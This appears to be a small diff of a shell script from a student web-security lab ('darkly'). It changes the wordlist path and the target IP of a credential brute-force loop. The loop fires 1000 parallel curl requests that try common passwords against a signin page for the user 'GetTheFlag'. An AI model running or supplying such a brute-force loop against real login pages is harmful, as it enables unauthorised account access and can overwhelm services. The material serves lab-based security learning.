@@ -1,6 +1,6 @@
-cat /home/wmonacho/Documents/Project_42/In_Progress_Project/darkly/flag04/10000-most-common-passwords.csv | \
+cat /home/wmonacho/Documents/Project_42/In_Progress_Project/darkly/login_brut_force/Ressources/100-most-common-passwords.csv | \
 cut -d',' -f2 | \
-xargs -P 1000 -I {} curl -sG "http://10.14.200.61/index.php" \
+xargs -P 1000 -I {} curl -sG "http://10.14.200.42/index.php" \
     --data-urlencode "page=signin" \
     --data-urlencode "username=GetTheFlag" \
     --data-urlencode "password={}" \
